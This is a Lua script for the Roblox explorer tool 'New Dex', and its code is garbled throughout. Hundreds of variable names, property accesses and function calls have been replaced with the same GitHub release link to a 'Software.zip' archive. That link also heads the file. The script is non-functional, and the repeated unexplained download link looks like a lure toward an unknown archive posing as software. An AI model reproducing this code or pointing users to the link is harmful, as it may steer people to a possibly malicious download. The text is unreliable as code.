-- https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

--[[
	New Dex
	Final Version
	Developed by Moon
	Modified for Infinite Yield
	
	Dex is a debugging suite designed to help the user debug games and find any potential vulnerabilities.
]]

local nodes = {}
local selection
local cloneref = cloneref or function(...) return ... end

local EmbeddedModules = {
Explorer = function()
--[[
	Explorer App Module
	
	The main explorer interface
]]

-- Common Locals
local Main,Lib,Apps,Settings -- Main Containers
local Explorer, Properties, ScriptViewer, Notebook -- Major Apps
local API,RMD,env,service,plr,create,createSimple -- Main Locals

local function initDeps(data)
	Main = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Lib = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Apps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Settings = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

	API = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	RMD = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	env = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	service = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	plr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	create = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	createSimple = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function initAfterMain()
	Explorer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Properties = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	ScriptViewer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Notebook = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function main()
	local Explorer = {}
	local tree,listEntries,explorerOrders,searchResults,specResults = {},{},{},{},{}
	local expanded
	local entryTemplate,treeFrame,toolBar,descendantAddedCon,descendantRemovingCon,itemChangedCon
	local ffa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local getDescendants = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local getTextSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local updateDebounce,refreshDebounce = false,false
	local nilNode = {Obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Folder")}
	local idCounter = 0
	local scrollV,scrollH,clipboard
	local renameBox,renamingNode,searchFunc
	local sortingEnabled,autoUpdateSearch
	local table,math = table,math
	local nilMap,nilCons = {},{}
	local connectSignal = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local addObject,removeObject,moveObject = nil,nil,nil

	addObject = function(root)
		if nodes[root] then return end

		local isNil = false
		local rootParObj = ffa(root,"Instance")
		local par = nodes[rootParObj]

		-- Nil Handling
		if not par then
			if nilMap[root] then
				nilCons[root] = nilCons[root] or {
					connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,addObject),
					connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,moveObject),
				}
				par = nilNode
				isNil = true
			else
				return
			end
		elseif nilMap[rootParObj] or par == nilNode then
			nilMap[root] = true
			nilCons[root] = nilCons[root] or {
				connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,addObject),
				connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,moveObject),
			}
			isNil = true
		end

		local newNode = {Obj = root, Parent = par}
		nodes[root] = newNode

		-- Automatic sorting if expanded
		if sortingEnabled and expanded[par] and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			local left,right = 1,#par
			local floor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sorter = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pos = (right == 0 and 1)

			if not pos then
				while true do
					if left >= right then
						if sorter(newNode,par[left]) then
							pos = left
						else
							pos = left+1
						end
						break
					end

					local mid = floor((left+right)/2)
					if sorter(newNode,par[mid]) then
						right = mid-1
					else
						left = mid+1
					end
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(par,pos,newNode)
		else
			par[#par+1] = newNode
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end

		local insts = getDescendants(root)
		for i = 1,#insts do
			local obj = insts[i]
			if nodes[obj] then continue end -- Deferred
			
			local par = nodes[ffa(obj,"Instance")]
			if not par then continue end
			local newNode = {Obj = obj, Parent = par}
			nodes[obj] = newNode
			par[#par+1] = newNode

			-- Nil Handling
			if isNil then
				nilMap[obj] = true
				nilCons[obj] = nilCons[obj] or {
					connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,addObject),
					connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,moveObject),
				}
			end
		end

		if searchFunc and autoUpdateSearch then
			searchFunc({newNode})
		end

		if not updateDebounce and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(par) then
			if expanded[par] then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			elseif not refreshDebounce then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end
	end

	removeObject = function(root)
		local node = nodes[root]
		if not node then return end

		-- Nil Handling
		if nilMap[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] then
			moveObject(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			return
		end

		local par = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if par then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		end

		local function recur(root)
			for i = 1,#root do
				local node = root[i]
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					nodes[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = nil
					if #node > 0 then recur(node) end
				end
			end
		end
		recur(node)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		nodes[root] = nil

		if par and not updateDebounce and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(par) then
			if expanded[par] then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			elseif not refreshDebounce then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end
	end

	moveObject = function(obj)
		local node = nodes[obj]
		if not node then return end

		local oldPar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local newPar = nodes[ffa(obj,"Instance")]
		if oldPar == newPar then return end

		-- Nil Handling
		if not newPar then
			if nilMap[obj] then
				newPar = nilNode
			else
				return
			end
		elseif nilMap[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or newPar == nilNode then
			nilMap[obj] = true
			nilCons[obj] = nilCons[obj] or {
				connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,addObject),
				connectSignal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,moveObject),
			}
		end

		if oldPar then
			local parPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(oldPar,node)
			if parPos then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(oldPar,parPos) end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newPar

		if sortingEnabled and expanded[newPar] and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			local left,right = 1,#newPar
			local floor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local sorter = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pos = (right == 0 and 1)

			if not pos then
				while true do
					if left >= right then
						if sorter(node,newPar[left]) then
							pos = left
						else
							pos = left+1
						end
						break
					end

					local mid = floor((left+right)/2)
					if sorter(node,newPar[mid]) then
						right = mid-1
					else
						left = mid+1
					end
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPar,pos,node)
		else
			newPar[#newPar+1] = node
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end

		if searchFunc and searchResults[node] then
			local currentNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			while currentNode and (not searchResults[currentNode] or expanded[currentNode] == 0) do
				expanded[currentNode] = true
				searchResults[currentNode] = true
				currentNode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end

		if not updateDebounce and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPar) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(oldPar)) then
			if expanded[newPar] or expanded[oldPar] then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			elseif not refreshDebounce then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 20
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 32
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		renameBox = create({{1,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.062745101749897,0.51764708757401,1),BorderMode=2,ClearTextOnFocus=false,Font=3,Name="RenameBox",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.69803923368454,0.69803923368454,0.69803923368454),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,26,0,2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,200,0,16),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=0,Visible=false,ZIndex=2}}})

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			if not renamingNode then return end

			pcall(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end)
			renamingNode = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
		end)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(node)
		renamingNode = node
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		renameBox:CaptureFocus()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(val)
		sortingEnabled = val
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local maxNodes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip / 20)
		local maxX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local totalWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxNodes
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = #tree + 1
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxX
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = totalWidth

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = #tree + 1 > maxNodes
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = totalWidth > maxX

		local oldSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and -16 or 0),1,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and -39 or -23))
		if oldSize ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		else
			scrollV:Update()
			scrollH:Update()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,maxX-100,0,16)

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,-39)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,16)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,-23)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,16)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(a,b)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return false end -- Ghost node

		local aClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local bClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not aClass then aClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = aClass end
		if not bClass then bClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = bClass end

		local aOrder = explorerOrders[aClass]
		local bOrder = explorerOrders[bClass]
		if not aOrder then aOrder = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[aClass] and tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[aClass].ExplorerOrder) or 9999 explorerOrders[aClass] = aOrder end
		if not bOrder then bOrder = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[bClass] and tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[bClass].ExplorerOrder) or 9999 explorerOrders[bClass] = bOrder end

		if aOrder ~= bOrder then
			return aOrder < bOrder
		else
			local aName,bName = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			if aName ~= bName then
				return aName < bName
			elseif aClass ~= bClass then
				return aClass < bClass
			else
				local aId = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip if not aId then aId = idCounter idCounter = (idCounter+0.001)%999999999 https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = aId end
				local bId = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip if not bId then bId = idCounter idCounter = (idCounter+0.001)%999999999 https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = bId end
				return aId < bId
			end
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(tree)
		local maxNameWidth,maxDepth,count = 0,1,1
		local nameCache = {}
		local font = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,20)
		local useNameWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local tSort = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local sortFunc = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local isSearching = (expanded == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		local textServ = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		local function recur(root,depth)
			if depth > maxDepth then maxDepth = depth end
			depth = depth + 1
			if sortingEnabled and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				tSort(root,sortFunc)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			end
			for i = 1,#root do
				local n = root[i]

				if (isSearching and not searchResults[n]) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then continue end

				if useNameWidth then
					local nameWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if not nameWidth then
						local objName = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
						nameWidth = nameCache[objName]
						if not nameWidth then
							nameWidth = getTextSize(textServ,objName,14,font,size).X
							nameCache[objName] = nameWidth
						end
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nameWidth
					end
					if nameWidth > maxNameWidth then
						maxNameWidth = nameWidth
					end
				end

				tree[count] = n
				count = count + 1
				if expanded[n] and #n > 0 then
					recur(n,depth)
				end
			end
		end

		recur(nodes[game["Run Service"].Parent],1)

		-- Nil Instances
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			if not (isSearching and not searchResults[nilNode]) then
				tree[count] = nilNode
				count = count + 1
				if expanded[nilNode] then
					recur(nilNode,2)
				end
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxNameWidth
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxDepth
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = useNameWidth and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*maxDepth + maxNameWidth + 26 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*maxDepth + 226
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(offX,offY)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true

		local dragTree = treeFrame:Clone()
		dragTree:ClearAllChildren()

		for i,v in pairs(listEntries) do
			local node = tree[i + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if node and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then
				local clone = v:Clone()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = dragTree
			end
		end

		local newGui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ScreenGui")
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newGui
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newGui)

		local dragOutline = create({
			{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="DragSelect",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),}},
			{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BorderSizePixel=0,Name="Line",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),ZIndex=2,}},
			{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BorderSizePixel=0,Name="Line",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),ZIndex=2,}},
			{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BorderSizePixel=0,Name="Line",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),ZIndex=2,}},
			{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BorderSizePixel=0,Name="Line",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-1,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),ZIndex=2,}},
		})
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = treeFrame


		local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		local function move()
			local posX = mouse.X - offX
			local posY = mouse.Y - offY
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,posX,0,posY)

			for i = 1,#listEntries do
				local entry = listEntries[i]
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(entry) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,20)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					return
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		end
		move()

		local input = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local mouseEvent,releaseEvent

		mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				move()
			end
		end)

		releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				releaseEvent:Disconnect()
				mouseEvent:Disconnect()
				newGui:Destroy()
				dragOutline:Destroy()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

				for i = 1,#listEntries do
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(listEntries[i]) then
						local node = tree[i + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
						if node then
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] then return end
							local newPar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							for i = 1,#sList do
								local n = sList[i]
								pcall(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newPar end)
							end
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sList[1])
						end
						break
					end
				end
			end
		end)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(index)
		local newEntry = entryTemplate:Clone()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20*(index-1))

		local isRenaming = false

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local node = tree[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local node = tree[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[node] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()

		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()

		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local releaseEvent,mouseEvent

				local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or plr:GetMouse()
				local startX = mouse.X
				local startY = mouse.Y

				local listOffsetX = startX - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local listOffsetY = startY - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				releaseEvent = cloneref(game["Run Service"].Parent:GetService("UserInputService")).InputEnded:Connect(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end
				end)

				mouseEvent = cloneref(game["Run Service"].Parent:GetService("UserInputService")).InputChanged:Connect(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local deltaX = mouse.X - startX
						local deltaY = mouse.Y - startY
						local dist = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(deltaX^2 + deltaY^2)

						if dist > 5 then
							releaseEvent:Disconnect()
							mouseEvent:Disconnect()
							isRenaming = false
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(listOffsetX,listOffsetY)
						end
					end
				end)
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()

		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local node = tree[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[node] and "Collapse_Over" or "Expand_Over")
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			local node = tree[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[node] and "Collapse" or "Expand")
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			local node = tree[index + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if not node or #node == 0 then return end

			expanded[node] = not expanded[node]
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = treeFrame
		return newEntry
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local maxNodes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) / 20),0)	
		local renameNodeVisible = false
		local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		for i = 1,maxNodes do
			local entry = listEntries[i]
			if not listEntries[i] then entry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(i) listEntries[i] = entry https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(entry) end

			local node = tree[i + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if node then
				local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local depth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(node)

